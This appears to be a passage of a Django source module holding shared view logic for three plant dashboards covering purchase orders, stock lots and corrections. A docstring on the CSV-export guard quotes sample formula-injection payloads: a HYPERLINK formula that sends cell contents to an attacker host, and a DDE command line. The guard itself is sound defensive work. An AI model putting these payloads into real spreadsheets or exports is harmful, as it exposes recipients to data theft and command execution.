"""
Shared implementation behind the three domestic plant routers (hrs_views.py /
vapi_views.py / achhad_views.py). See CLAUDE.md's "Domestic router
de-duplication" for the history: those three files used to duplicate this
logic near-verbatim (confirmed byte-for-byte identical except model classes,
which run_full_match to call, and a handful of real schema differences -
Achhad's Stock lot has rate/msl instead of basic_rate/sub_category/uom and
no vendor column at all). This module holds the one real implementation;
each plant's own router file builds a `_PlantConfig` and re-exports these
functions under the same names urls.py already points at, so urls.py and
every view's external behavior are unchanged by this refactor - only where
the code physically lives changed.

Not shared: which matching module's run_full_match to call (matching.py /
matching_achhad.py / matching_vapi.py are separately tuned scoring modules,
see CLAUDE.md's "PO<->MIR<->Stock matching") and the model classes
themselves - both are supplied per-plant via `_PlantConfig`, not branched on
inline here.
"""

import csv
import datetime
import decimal
from dataclasses import dataclass
from decimal import Decimal
from typing import Callable, Optional

from django.core.cache import cache
from django.db import transaction
from django.utils import timezone
from django.http import HttpResponse, StreamingHttpResponse
from rest_framework.decorators import api_view, permission_classes, throttle_classes
from rest_framework.response import Response

from apps.api.permissions import IsAdmin, IsEditor, SyncTriggerThrottle, user_can_access_plant, user_can_edit_plant
from django.db.models import Q

from apps.core.models import (
    DataQualityFlag,
    DomesticPOCorrection,
    FlagDismissal,
    ManualMirMatch,
    MaterialCategoryReference,
    MaterialCorrection,
)
from apps.services.flag_dismiss import dismiss_po_flag
from apps.services.match_dismiss import dismiss_match
# line_item_positions() is the matcher's OWN numbering - imported rather
# than re-derived so the API and matching_core can never disagree about
# which line a manual MIR pin addresses.
from apps.services.matching_core import line_item_positions
from apps.services.mir_without_po import (
    BUCKET_LABELS,
    BUCKET_ORDER,
    mir_without_po_rows,
    mir_without_po_summary,
)
from apps.services.no_po_vendors import no_po_vendor_summary, purchases_without_po_summary
from apps.services.rm_untracked import rm_untracked_summary
from apps.services.parsers.common import normalize_material
from apps.services.consumption_periods import consumption_rates
from apps.services.sync_trigger import is_sync_in_progress, trigger_plant_sync
from apps.services.validation import is_valid_email, is_valid_gstin

# Identical across all three plants (confirmed byte-for-byte in the prior
# audit) - one copy here rather than three.
_PO_EDITABLE_FIELDS = {
    "po_created_date", "vendor_name", "vendor_address", "vendor_gstin", "vendor_email", "vendor_code",
    "billing_address", "ship_to", "payment_terms", "incoterms", "currency", "total_value", "tax_type",
    "total_inclusive_value", "remarks",
}
_ITEM_EDITABLE_FIELDS = {"description", "hsn", "qty", "uom", "delivery_date", "net_price", "net_value"}
_DATE_FIELDS = {"po_created_date", "delivery_date"}
_DECIMAL_FIELDS = {"total_value", "total_inclusive_value", "qty", "net_price", "net_value"}
_REMATCH_TRIGGER_FIELDS = {"vendor_name", "vendor_gstin", "description", "qty", "net_price", "net_value"}


@dataclass(frozen=True)
class _PlantConfig:
    """Everything genuinely different between HRS/Vapi/Achhad's domestic
    routers. `lot_vendor_field`/`lot_code_field`/`lot_rate_field` are model
    attribute names read via getattr, not branched-on plant checks -
    Achhad's model simply has no vendor field at all, so lot_vendor_field is
    None there rather than a fake placeholder."""

    key: str  # "hrs" / "vapi" / "achhad" - passed to user_can_edit_plant/is_sync_in_progress/trigger_plant_sync
    syncrun_plant: str  # SyncRun.Plant.HRS / .RTP_VAPI / .RTP_ACHHAD

    po_model: type
    item_model: type
    mir_model: type
    po_mir_match_model: type
    mir_stock_match_model: type
    stock_lot_model: type
    stock_snapshot_model: type

    run_full_match: Callable[[], object]

    # This plant's matching_*.py MATCH_CONFIG. Injected for the same reason
    # run_full_match is: the three matchers are separately tuned and their
    # configs are not interchangeable. Read by make_mir_without_po() below,
    # which deliberately classifies MIR rows with the MATCHER's own idea of
    # "we hold this PO number" (matching_core.known_po_numbers /
    # _names_known_po) rather than a second, string-equality one - see
    # services/mir_without_po.py's docstring for the ~120 HRS rows that
    # choice moves between buckets.
    match_config: object

    material_editable_fields: frozenset
    material_decimal_fields: frozenset
    material_rematch_trigger_fields: frozenset

    lot_rate_field: str  # "basic_rate" (HRS/Vapi) or "rate" (Achhad)
    lot_code_field: str  # "sap_item_code" (HRS) / "hsn_code" (Vapi) / "sap_code" (Achhad)
    lot_vendor_field: Optional[str] = None  # "party_name" (HRS) / "supplier_name" (Vapi) / None (Achhad)

    # Days-Left Engine extension (2026-09-08, Achhad only): RTPAchhadRMDailyMovement's
    # sparse (stock_lot, movement_date) -> (received, issued) rows, parsed
    # from Achhad's own daily Recp./Issue matrix - see that model's
    # docstring for why this is trustworthy. None for HRS/Vapi, whose Stock
    # files have no day-by-day matrix to parse in the first place.
    daily_movement_model: Optional[type] = None


# ── Serialization helpers ─────────────────────────────────────────────────────

def _serialize(value):
    if isinstance(value, datetime.date):
        return value.isoformat()
    if isinstance(value, Decimal):
        return float(value)
    return value


# Characters that make Excel/LibreOffice/Sheets treat a CSV cell as a FORMULA
# rather than text. Tab and carriage return are included because Excel strips
# leading whitespace before deciding, so "\t=cmd|..." is still a formula to it.
_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """Neutralize CSV formula injection (CWE-1236) for one exported cell.

    Added 2026-09-15 (audit pass). Every text column in this app's exports -
    material description, category, vendor name - originates in a Google Drive
    spreadsheet that plant staff edit by hand, and is written to the CSV
    verbatim. A cell whose text begins `=`, `+`, `-` or `@` is executed as a
    formula the moment the downloaded file is opened, so a value like
    `=HYPERLINK("http://attacker/"&A1,"Click")` exfiltrates neighbouring cells
    on click, and the legacy DDE form (`=cmd|'/c calc'!A0`) can prompt to run a
    local command outright. The data source is explicitly a shared,
    externally-editable set of spreadsheets and the whole point of this export
    is to be reopened in Excel, so this is a live path, not a theoretical one.

    The fix is the standard one: prefix a single quote, which Excel consumes as
    "treat the rest as literal text" on open. Deliberately NOT stripping or
    rejecting the character - a material genuinely named "-40C GRADE" must still
    export with its leading hyphen intact and readable.

    Non-string values (Decimal, date, int, bool, None) are returned untouched:
    csv.writer renders them itself and none can carry a leading formula
    character. That matters for correctness, not just tidiness - quoting a
    numeric column would turn every quantity in the export into text that
    Excel will not sum."""
    if isinstance(value, str) and value.startswith(_CSV_FORMULA_PREFIXES):
        return "'" + value
    return value


class _Echo:
    """A file-like object that returns what it is asked to write instead of
    storing it - the standard Django pattern for streaming a CSV
    (docs: "Streaming large CSV files"). csv.writer needs something with a
    .write(); handing it this makes writerow() RETURN the rendered line, which
    the generator then yields straight to the client. Nothing accumulates."""

    def write(self, value):
        return value


class SafeCsvWriter:
    """csv.writer wrapper that runs every cell through csv_safe() on the way
    out.

    Deliberately a wrapper rather than a `[csv_safe(v) for v in row]` at each
    call site: the export below writes 15 columns today and will grow, and a
    guard you have to remember to apply per column is one that eventually gets
    forgotten on exactly the column that needed it. Wrapping the writer makes
    the safe path the only path - a new column is protected by construction.
    Use this instead of csv.writer() for ANY new export."""

    def __init__(self, fileobj):
        self._writer = csv.writer(fileobj)

    def writerow(self, row):
        # Returns whatever the underlying file-like object's write() returned.
        # For a real buffer that is a character count (ignored); for _Echo it
        # is the rendered CSV line itself, which is what makes streaming work.
        return self._writer.writerow([csv_safe(v) for v in row])

    def writerows(self, rows):
        for row in rows:
            self.writerow(row)


def _coerce_value(field_name, raw_value):
    if raw_value is None or raw_value == "":
        return None
    if field_name in _DATE_FIELDS:
        return datetime.date.fromisoformat(raw_value)
    if field_name in _DECIMAL_FIELDS:
        try:
            return Decimal(str(raw_value))
        except decimal.InvalidOperation:
            raise ValueError(f"{raw_value!r} is not a valid decimal")
    return str(raw_value)


def _field_warning(field_name, value):
    if field_name == "vendor_gstin" and not is_valid_gstin(value):
        return f"{value!r} doesn't look like a standard 15-character GSTIN."
    if field_name == "vendor_email" and not is_valid_email(value):
        return f"{value!r} doesn't look like a valid email address."
    return None


def _coerce_material_value(cfg: _PlantConfig, field_name, raw_value):
    if raw_value is None or raw_value == "":
        return None
    if field_name in cfg.material_decimal_fields:
        try:
            return Decimal(str(raw_value))
        except decimal.InvalidOperation:
            raise ValueError(f"{raw_value!r} is not a valid decimal")
    return str(raw_value)


def _correction_dict(c):
    return {
        "fieldName": c.field_name,
        "itemId": c.item_id,
        "oldValue": c.old_value,
        "newValue": c.new_value,
        "reason": c.reason,
        "correctedBy": c.corrected_by_email,
        "correctedAt": c.corrected_at.isoformat(),
    }


def _material_correction_dict(c):
    return {
        "fieldName": c.field_name,
        "oldValue": c.old_value,
        "newValue": c.new_value,
        "reason": c.reason,
        "correctedBy": c.corrected_by_email,
        "correctedAt": c.corrected_at.isoformat(),
    }


def _flag_dismissal_dict(fd):
    return {
        "flagKey": fd.flag_key,
        "dismissed": fd.dismissed,
        "dismissedBy": fd.dismissed_by_email,
        "dismissedReason": fd.dismissed_reason,
        "dismissedAt": fd.dismissed_at.isoformat() if fd.dismissed_at else None,
    }


def _data_quality_flag_dict(flag):
    """Match Accuracy Programme fix 3.G: one apps/services/arithmetic_checks.py
    mismatch, surfaced in the Flags & Corrections tab alongside
    FlagDismissal-backed flags (see poFlagHtml()'s own comment in
    frontend/js/flags.js for the rendering side)."""
    return {
        "sourceType": flag.source_type,
        "checkName": flag.check_name,
        "expected": float(flag.expected),
        "actual": float(flag.actual),
        "detectedAt": flag.detected_at.isoformat() if flag.detected_at else None,
    }


def _line_item_dict(item, item_ref=""):
    match = getattr(item, "mir_match", None)
    return {
        # The line's address for a manual MIR pin (matching_core's
        # line_item_positions()). Domestic line items have no stable id of
        # their own - see ManualMirMatch's docstring - so this is a
        # position, and it is the ONLY thing the frontend may use to
        # address a line: item_id is neither unique nor always present.
        "itemRef": item_ref,
        "manuallyPinned": bool(match and getattr(match, "manually_pinned", False)),
        "description": item.description,
        "qty": float(item.qty) if item.qty is not None else None,
        "uom": item.uom,
        "netPrice": float(item.net_price) if item.net_price is not None else None,
        "deliveryDate": item.delivery_date.isoformat() if item.delivery_date else None,
        "matched": match is not None,
        "matchId": match.id if match else None,
        "matchTier": match.tier if match else None,
        "matchScore": float(match.match_score) if match else None,
        "matchFlagged": match.is_flagged if match else False,
        "dismissedByOverride": match.dismissed_by_override if match else False,
        "dismissedReason": match.dismissed_reason if match else "",
        "dismissedBy": match.dismissed_by.email if match and match.dismissed_by else None,
        "dismissedAt": match.dismissed_at.isoformat() if match and match.dismissed_at else None,
        "qtyDiffPct": float(match.qty_diff_pct) if match and match.qty_diff_pct is not None else None,
        # Over vs under delivery (2026-09-18). True = more received than
        # ordered, false = less, null = no quantity comparison was possible.
        # Null is NOT the same as false, so this passes the three states
        # through rather than coercing to a boolean - the frontend needs to
        # tell "under-delivered" from "we could not tell".
        "qtyOverDelivered": getattr(match, "qty_over_delivered", None) if match else None,
        "rateDiffPct": float(match.rate_diff_pct) if match and match.rate_diff_pct is not None else None,
        "valueDiffPct": float(match.value_diff_pct) if match and match.value_diff_pct is not None else None,
        # Match Accuracy Programme fixes 2.C/3.F - see matching_core.py.
        # uomMismatch/severity are the real, stored backend decision; the
        # frontend must not re-derive a value flag from valueDiffPct alone
        # anymore (that would ignore the value epsilon) - see flags.js's
        # matchStatusHtml() for how these are actually used.
        "uomMismatch": bool(match and match.uom_mismatch),
        "severity": match.severity if match else None,
        "matchedMirNo": match.mir_entry.mir_no if match else None,
        "stockMatched": bool(match and len(match.mir_entry.stock_matches.all()) > 0),
        # Identification/Financial-Check redesign (2026-09-07, see
        # matching_core.py's module docstring): matchFlagged (is_flagged)
        # above now means specifically "qty or rate mismatched" - these
        # fields expose that split plus everything routed into the new
        # dataMismatch bucket (UOM/Net/Taxable-Value/GST-type/Final-Value)
        # instead of blending it back into one boolean.
        "materialMatched": bool(match and match.material_matched),
        "poNumberMatched": bool(match and match.po_number_matched),
        # vendorMatched is FALSE only on a plant running identification
        # 2-of-3 (Achhad, 2026-09-18) - everywhere else vendor is still the
        # mandatory gate, so a match cannot exist without it and this is
        # always True. False means the match was identified by its PO number
        # and material while the party name disagreed: a real name error at
        # source, surfaced as its own Data Quality Flag rather than silently
        # accepted. Defaults to True (not False) for a plant/row that has no
        # such column, so the flag never fires where the concept does not
        # apply.
        "vendorMatched": bool(not match or getattr(match, "vendor_matched", True)),
        "qtyMismatched": bool(match and match.qty_mismatched),
        "rateMismatched": bool(match and match.rate_mismatched),
        "dataMismatch": bool(match and match.data_mismatch),
        "taxTypeMismatch": bool(match and match.tax_type_mismatch),
        "taxableValueDiffPct": (
            float(match.taxable_value_diff_pct) if match and match.taxable_value_diff_pct is not None else None
        ),
        "finalValueDiffPct": (
            float(match.final_value_diff_pct) if match and match.final_value_diff_pct is not None else None
        ),
        # Added 2026-09-08 (Data Quality Flags clarity pass) - the specific,
        # already-epsilon-gated booleans dataMismatch used to blend together
        # with no way to tell which one fired. See flags.js's
        # computePoFlags() for the Data Quality Flag categories these drive.
        "netValueMismatched": bool(match and match.net_value_mismatched),
        "taxableValueMismatched": bool(match and match.taxable_value_mismatched),
        "finalValueMismatched": bool(match and match.final_value_mismatched),
    }


def _group_by(objects, attr):
    """One query's results, grouped into a dict of lists keyed by `attr` -
    the batching primitive _po_dict/_lot_dict use to avoid a per-row query,
    same reasoning as _consumption_by_lot()'s own docstring."""
    grouped: dict = {}
    for obj in objects:
        grouped.setdefault(getattr(obj, attr), []).append(obj)
    return grouped


def _po_material_categories(items, category_reference) -> list[dict]:
    """De-duplicated {category, subCategory} pairs across this PO's own line
    items, looked up the same canonical way _lot_dict() looks up a Stock
    lot's category - see MaterialCategoryReference's own docstring
    (apps/core/models.py). Added 2026-09-08 so the Purchase Orders page can
    filter/group by the materials a PO actually orders - "Filter by
    Category"/"Sub Category" on this page previously meant Data Quality
    Flag severity/label instead (moved to "Filter by Flags" - see
    po-list.js's own comment on why), which was never material data at all."""
    seen: dict[tuple[str, str], dict] = {}
    for item in items:
        ref = (category_reference or {}).get(normalize_material(item.description))
        category = ref.category if ref else "Uncategorized"
        subcategory = ref.subcategory if ref else ""
        seen[(category, subcategory)] = {"category": category, "subCategory": subcategory}
    return list(seen.values())


def _po_dict(cfg: _PlantConfig, po, corrections_by_po=None, flag_dismissals_by_po=None,
             item_flags_by_item=None, mir_flags_by_mir_entry=None, category_reference=None):
    items = list(po.items.all())
    # N+1 fix (see CLAUDE.md): make_purchase_orders() batches these four
    # queries once for the whole queryset and passes per-PO/per-item maps in,
    # rather than this function querying per PO. The `is None` fallback (one
    # query per call) only exists for a caller outside that batched path -
    # there isn't one today, but it keeps this function safe to call
    # standalone (e.g. from a future detail endpoint or a test) without
    # silently returning empty corrections/flags.
    if corrections_by_po is not None:
        corrections = corrections_by_po.get(po.po_number, [])
    else:
        corrections = DomesticPOCorrection.objects.filter(plant=cfg.syncrun_plant, po_number=po.po_number)
    if flag_dismissals_by_po is not None:
        flag_dismissals = flag_dismissals_by_po.get(po.po_number, [])
    else:
        flag_dismissals = FlagDismissal.objects.filter(plant=cfg.syncrun_plant, po_number=po.po_number)
    # Match Accuracy Programme fix 3.G: this PO's own line items' arithmetic
    # flags, plus any flag on the MIR entry a line item matched to (a real
    # MIR data-quality issue is still relevant here even though MIR has no
    # detail view of its own to attach it to directly).
    if item_flags_by_item is not None and mir_flags_by_mir_entry is not None:
        data_quality_flags = [f for i in items for f in item_flags_by_item.get(i.id, [])] + [
            f for i in items if getattr(i, "mir_match", None)
            for f in mir_flags_by_mir_entry.get(i.mir_match.mir_entry_id, [])
        ]
    else:
        item_ids = [i.id for i in items]
        mir_entry_ids = [i.mir_match.mir_entry_id for i in items if getattr(i, "mir_match", None)]
        data_quality_flags = list(DataQualityFlag.objects.filter(
            plant=cfg.syncrun_plant, source_type=DataQualityFlag.SourceType.PO_LINE_ITEM, source_id__in=item_ids,
        )) + list(DataQualityFlag.objects.filter(
            plant=cfg.syncrun_plant, source_type=DataQualityFlag.SourceType.MIR_ENTRY, source_id__in=mir_entry_ids,
        ))
    return {
        "poNumber": po.po_number,
        "vendorName": po.vendor_name,
        "vendorGstin": po.vendor_gstin,
        "vendorAddress": po.vendor_address,
        "vendorEmail": po.vendor_email,
        "vendorCode": po.vendor_code,
        "billingAddress": po.billing_address,
        "shipTo": po.ship_to,
        "currency": po.currency,
        "taxType": po.tax_type,
        "createdDate": po.po_created_date.isoformat() if po.po_created_date else None,
        "totalValue": float(po.total_value) if po.total_value is not None else None,
        "totalInclTax": float(po.total_inclusive_value) if po.total_inclusive_value is not None else None,
        "paymentTerms": po.payment_terms,
        "incoterms": po.incoterms,
        "remarks": po.remarks,
        "isOldFormat": po.is_old_format_template,
        "materialCategories": _po_material_categories(items, category_reference),
        # Numbered per PO in pk order - the master CSV's own row order, and
        # the same numbering the matcher uses to resolve a pin.
        "items": [_line_item_dict(i, str(n)) for n, i in enumerate(sorted(items, key=lambda x: x.id))],
        "corrections": [_correction_dict(c) for c in corrections],
        "flagDismissals": [_flag_dismissal_dict(fd) for fd in flag_dismissals],
        "dataQualityFlags": [_data_quality_flag_dict(f) for f in data_quality_flags],
    }


def _category_reference_map() -> dict[str, MaterialCategoryReference]:
    """One query for the whole (small, shared-across-plants) canonical
    Category/Subcategory table - see MaterialCategoryReference's own
    docstring (apps/core/models.py) for the full design. Called once per
    request (make_materials()), not once per lot."""
    return {ref.normalized_description: ref for ref in MaterialCategoryReference.objects.all()}


def _lot_dict(cfg: _PlantConfig, lot, consumption_by_material=None, category_reference=None,
              corrections_by_lot=None, flags_by_lot=None):
    # N+1 fix (see CLAUDE.md): make_materials() batches these two queries
    # once for the whole queryset and passes per-lot maps in, same reasoning
    # as _po_dict's own corrections_by_po/flag_dismissals_by_po above. The
    # `is None` fallback keeps this function safe to call standalone.
    if corrections_by_lot is not None:
        corrections = corrections_by_lot.get(lot.id, [])
    else:
        corrections = MaterialCorrection.objects.filter(plant=cfg.syncrun_plant, lot_id=lot.id)
    # Match Accuracy Programme fix 3.G: this lot's own stock-balance
    # arithmetic flag, if any (opening + received - issued vs todays_stock).
    if flags_by_lot is not None:
        data_quality_flags = flags_by_lot.get(lot.id, [])
    else:
        data_quality_flags = DataQualityFlag.objects.filter(
            plant=cfg.syncrun_plant, source_type=DataQualityFlag.SourceType.STOCK_LOT, source_id=lot.id,
        )
    rate = getattr(lot, cfg.lot_rate_field)
    # Consumption is a property of the MATERIAL now, not of this one vendor
    # lot - every sibling lot of the same material carries the identical
    # rate. `daysLeft` below is still this lot's own cover (its quantity at
    # the material's burn rate), because a lot row is what this dict
    # describes; materials.js's aggregateMaterialsByName() replaces it with
    # the group's own quantity over that same once-counted rate. **It must
    # not sum the rate across sibling lots** - that was correct when each
    # lot carried its own fragment and would now multiply by the lot count.
    material_key = normalize_material(lot.description)
    consumption = dict((consumption_by_material or {}).get(material_key) or {}) or None
    if consumption:
        avg_daily = consumption.get("avgDaily")
        consumption["daysLeft"] = float(lot.todays_stock) / avg_daily if avg_daily else None
    # Achhad's Stock sheet has a Minimum Stock Level column HRS/Vapi lack
    # entirely (RTPAchhadRMLot.msl) - getattr's default None means this
    # is always None on HRS/Vapi rows without any per-plant branching, same
    # pattern as no_of_days/sub_category above. daysToMsl is 0 the moment
    # current stock is at/below msl (independent of whether a consumption
    # rate is even known yet - "already need to reorder" shouldn't wait on
    # 30 days of snapshot history to surface), else an ETA once avgDaily is
    # available, else None (below msl not yet reached, no rate to project).
    msl = getattr(lot, "msl", None)
    days_to_msl = None
    if msl is not None:
        remaining = float(lot.todays_stock) - float(msl)
        if remaining <= 0:
            days_to_msl = 0.0
        elif consumption and consumption.get("avgDaily"):
            days_to_msl = remaining / consumption["avgDaily"]
    # Canonical Category/Subcategory lookup (2026-09-08) - see
    # MaterialCategoryReference's own docstring for why this REPLACES the
    # lot's own raw category/sub_category for display rather than merely
    # filling gaps: HRS's/Vapi's own Stock files carry a free-text per-row
    # Category column real data fills inconsistently (confirmed - grouping
    # by it produced close to one bucket per material), so a populated-but-
    # noisy raw value is exactly as unusable for grouping as a blank one.
    # The raw fields are untouched in the DB (still there for audit/the
    # existing "Edit Everywhere" correction feature) - only this API
    # response's display value changes.
    ref = (category_reference or {}).get(normalize_material(lot.description))
    canonical_category = ref.category if ref else "Uncategorized"
    canonical_subcategory = ref.subcategory if ref else ""
    return {
        "lotId": lot.id,
        "materialCode": getattr(lot, cfg.lot_code_field) or str(lot.id),
        "description": lot.description,
        "category": canonical_category,
        "subCategory": canonical_subcategory,
        "corrections": [_material_correction_dict(c) for c in corrections],
        "uom": getattr(lot, "uom", ""),
        "qty": float(lot.todays_stock),
        "rate": float(rate) if rate is not None else None,
        "value": float(lot.value) if lot.value is not None else None,
        "vendor": getattr(lot, cfg.lot_vendor_field, None) if cfg.lot_vendor_field else None,
        "receivedDate": lot.received_date.isoformat() if lot.received_date else None,
        # HRS's model has a real no_of_days field; Vapi/Achhad's models have
        # none - getattr's default None reproduces both hrs_views.py's real
        # value and vapi_views.py's/achhad_views.py's hardcoded None.
        "noOfDays": getattr(lot, "no_of_days", None),
        # Read from the MaterialConsumptionDaily ledger, keyed on the
        # material - see _consumption_by_material() above and CLAUDE.md's
        # "Consumption ledger" section. None when this material has no
        # ledger rows in the window at all (nothing issued, or no snapshot
        # history yet). `confidence` now reports how much of the window
        # genuinely carries data rather than how long the span between the
        # first and last snapshot happens to be, so expect thinner bands
        # than before until the snapshot job runs daily - that is the
        # figure getting more honest, not worse.
        "consumption": consumption,
        "daysToMsl": days_to_msl,
        "mirMatched": len(lot.mir_matches.all()) > 0,
        "mirStockMatches": [
            {
                "matchId": m.id,
                "isFlagged": m.is_flagged,
                "dismissedByOverride": m.dismissed_by_override,
                "qtyDiffPct": float(m.qty_diff_pct) if m.qty_diff_pct is not None else None,
                "rateDiffPct": float(m.rate_diff_pct) if m.rate_diff_pct is not None else None,
                # MIR<->Stock identification/financial-check extension
                # (2026-09-08, HRS only for now - see matching_core.py's
                # match_mir_entry_stock() docstring). getattr with a None
                # default so Achhad/Vapi's rows (which don't set these,
                # config.stock_extended_fields=False for them) still
                # serialize cleanly instead of raising.
                "valueDiffPct": float(m.value_diff_pct) if getattr(m, "value_diff_pct", None) is not None else None,
                "materialMatched": getattr(m, "material_matched", None),
                "dateMatched": getattr(m, "date_matched", None),
                "qtyMismatched": getattr(m, "qty_mismatched", None),
                "rateMismatched": getattr(m, "rate_mismatched", None),
                "dataMismatch": getattr(m, "data_mismatch", None),
                # Added alongside the fix for the UOM-normalization gap this
                # field closes (found during a full-codebase audit,
                # 2026-09-10) - see HRSMirStockMatch's own field comment and
                # match_mir_entry_stock()'s docstring in matching_core.py.
                "uomMismatch": getattr(m, "uom_mismatch", None),
            }
            for m in lot.mir_matches.all()
        ],
        "dataQualityFlags": [_data_quality_flag_dict(f) for f in data_quality_flags],
    }


# ── View factories ─────────────────────────────────────────────────────────
# Each returns a plain function shaped exactly like the one hrs_views.py's
# module docstring describes - the plant router calls these once at import
# time and re-exports the result under the original name (e.g.
# `correct_field = make_correct_field(HRS_CONFIG)`), so urls.py needs no
# changes.

def make_purchase_orders(cfg: _PlantConfig):
    @api_view(["GET"])
    def purchase_orders(request):
        # See apps/api/permissions.py's user_can_access_plant() docstring -
        # low blast-radius: only affects accounts an admin already scoped
        # to specific plants (empty plants list = "all plants", unchanged).
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's purchase orders."}, status=403)
        # is_active=True (2026-09-18) - an order the master CSV no longer
        # lists is retired, not shown. Without this the dashboard kept
        # displaying a renamed PO's old spelling alongside its
        # replacement, which is how this bug was reported.
        qs = cfg.po_model.objects.filter(is_active=True).prefetch_related(
            "items", "items__mir_match", "items__mir_match__mir_entry", "items__mir_match__mir_entry__stock_matches",
        )
        pos = list(qs)

        # Batch every PO's corrections/flag-dismissals/data-quality-flags in
        # 4 queries total instead of ~4 per PO (N+1 fix - see CLAUDE.md's
        # "Domestic router de-duplication" section).
        corrections_by_po = _group_by(
            DomesticPOCorrection.objects.filter(plant=cfg.syncrun_plant), "po_number",
        )
        flag_dismissals_by_po = _group_by(
            FlagDismissal.objects.filter(plant=cfg.syncrun_plant), "po_number",
        )
        all_items = [i for po in pos for i in po.items.all()]
        item_ids = [i.id for i in all_items]
        mir_entry_ids = [i.mir_match.mir_entry_id for i in all_items if getattr(i, "mir_match", None)]
        item_flags_by_item = _group_by(
            DataQualityFlag.objects.filter(
                plant=cfg.syncrun_plant, source_type=DataQualityFlag.SourceType.PO_LINE_ITEM, source_id__in=item_ids,
            ),
            "source_id",
        )
        mir_flags_by_mir_entry = _group_by(
            DataQualityFlag.objects.filter(
                plant=cfg.syncrun_plant, source_type=DataQualityFlag.SourceType.MIR_ENTRY, source_id__in=mir_entry_ids,
            ),
            "source_id",
        )
        category_reference = _category_reference_map()

        return Response({
            "purchaseOrders": [
                _po_dict(
                    cfg, po, corrections_by_po, flag_dismissals_by_po, item_flags_by_item, mir_flags_by_mir_entry,
                    category_reference,
                )
                for po in pos
            ]
        })

    return purchase_orders


def make_correct_field(cfg: _PlantConfig):
    @api_view(["PATCH"])
    @permission_classes([IsEditor])
    def correct_field(request, po_number):
        if not user_can_edit_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to edit this plant's purchase orders."}, status=403)

        item_id = (request.data.get("itemId") or "").strip()
        field_name = (request.data.get("field") or "").strip()
        raw_value = request.data.get("value")
        reason = (request.data.get("reason") or "").strip()

        po = cfg.po_model.objects.filter(po_number=po_number, is_active=True).first()
        if not po:
            return Response({"error": "Purchase order not found."}, status=404)

        if item_id:
            if field_name not in _ITEM_EDITABLE_FIELDS:
                return Response({"error": f"{field_name!r} is not an editable item field."}, status=400)
            target = cfg.item_model.objects.filter(purchase_order=po, item_id=item_id).first()
            if not target:
                return Response({"error": "Line item not found."}, status=404)
        else:
            if field_name not in _PO_EDITABLE_FIELDS:
                return Response({"error": f"{field_name!r} is not an editable PO field."}, status=400)
            target = po

        old_value = getattr(target, field_name)
        try:
            new_value = _coerce_value(field_name, raw_value)
        except (TypeError, ValueError):
            return Response({"error": f"Invalid value for {field_name!r}: {raw_value!r}"}, status=400)

        with transaction.atomic():
            setattr(target, field_name, new_value)
            target.save(update_fields=[field_name])
            DomesticPOCorrection.objects.create(
                plant=cfg.syncrun_plant,
                po_number=po_number,
                item_id=item_id,
                field_name=field_name,
                old_value="" if old_value is None else str(old_value),
                new_value="" if new_value is None else str(new_value),
                reason=reason,
                corrected_by=request.user if getattr(request.user, "pk", None) else None,
                corrected_by_email=getattr(request.user, "email", ""),
            )

        if field_name in _REMATCH_TRIGGER_FIELDS:
            cfg.run_full_match()

        response = {"status": "ok", "field": field_name, "value": _serialize(new_value)}
        warning = _field_warning(field_name, new_value)
        if warning:
            response["warning"] = warning
        return Response(response)

    return correct_field


def _consumption_by_material(cfg: _PlantConfig) -> dict[str, dict]:
    """Every material's trailing-window consumption rate for this plant,
    keyed on `normalize_material(description)`, read from the materialised
    ledger in ONE query.

    **Replaces `_consumption_by_lot()` and `_daily_movement_points()`
    (2026-09-21).** Three things changed and each one matters:

    - **Read, not compute.** The figures come from MaterialConsumptionDaily,
      written by `compute_<plant>_consumption` on the same qcluster beat as
      the stock sync. This endpoint no longer replays snapshot history on
      every request, and it can no longer disagree with the report emails -
      they read the same rows now. The two used to be separate
      implementations and had already drifted (see
      apps/services/consumption_ledger.py's docstring).
    - **Keyed on the material, not the lot.** `*RMLot.natural_key` is
      `<code>|<vendor>#<occurrence>`, a shape MIR<->Stock matching needs and
      consumption does not - see MaterialConsumptionDaily's own docstring
      for the measured reshuffle that splices two materials' histories
      together. Sibling lots of one material now share one rate rather than
      each carrying a fragment of it.
    - **The arithmetic is different and the old numbers were inflated.**
      `stock_consumption.py` added the cumulative `received` LEVEL instead
      of its increment, overstating consumption 1.31x-1.85x per plant. See
      CLAUDE.md's "Consumption ledger" section.

    Still one query for the whole plant, not one per lot - the N+1 the old
    helper was built to avoid, with the same
    `django_assert_num_queries` regression test guarding it.
    """
    return consumption_rates(cfg.syncrun_plant, today=timezone.localdate())


def make_materials(cfg: _PlantConfig):
    @api_view(["GET"])
    def materials(request):
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's materials."}, status=403)
        qs = cfg.stock_lot_model.objects.filter(is_active=True).order_by("-value").prefetch_related("mir_matches")
        lots = list(qs)
        consumption_by_material = _consumption_by_material(cfg)
        category_reference = _category_reference_map()

        # Batch every lot's corrections/data-quality-flags in 2 queries total
        # instead of ~2 per lot (N+1 fix - see CLAUDE.md's "Domestic router
        # de-duplication" section).
        lot_ids = [lot.id for lot in lots]
        corrections_by_lot = _group_by(
            MaterialCorrection.objects.filter(plant=cfg.syncrun_plant, lot_id__in=lot_ids), "lot_id",
        )
        flags_by_lot = _group_by(
            DataQualityFlag.objects.filter(
                plant=cfg.syncrun_plant, source_type=DataQualityFlag.SourceType.STOCK_LOT, source_id__in=lot_ids,
            ),
            "source_id",
        )

        return Response({
            "materials": [
                _lot_dict(cfg, lot, consumption_by_material, category_reference, corrections_by_lot, flags_by_lot)
                for lot in lots
            ]
        })

    return materials


def make_correct_material_field(cfg: _PlantConfig):
    @api_view(["PATCH"])
    @permission_classes([IsEditor])
    def correct_material_field(request, lot_id: int):
        if not user_can_edit_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to edit this plant's materials."}, status=403)

        field_name = (request.data.get("field") or "").strip()
        raw_value = request.data.get("value")
        reason = (request.data.get("reason") or "").strip()

        if field_name not in cfg.material_editable_fields:
            return Response({"error": f"{field_name!r} is not an editable material field."}, status=400)

        lot = cfg.stock_lot_model.objects.filter(id=lot_id, is_active=True).first()
        if not lot:
            return Response({"error": "Material lot not found."}, status=404)

        old_value = getattr(lot, field_name)
        try:
            new_value = _coerce_material_value(cfg, field_name, raw_value)
        except (TypeError, ValueError):
            return Response({"error": f"Invalid value for {field_name!r}: {raw_value!r}"}, status=400)

        with transaction.atomic():
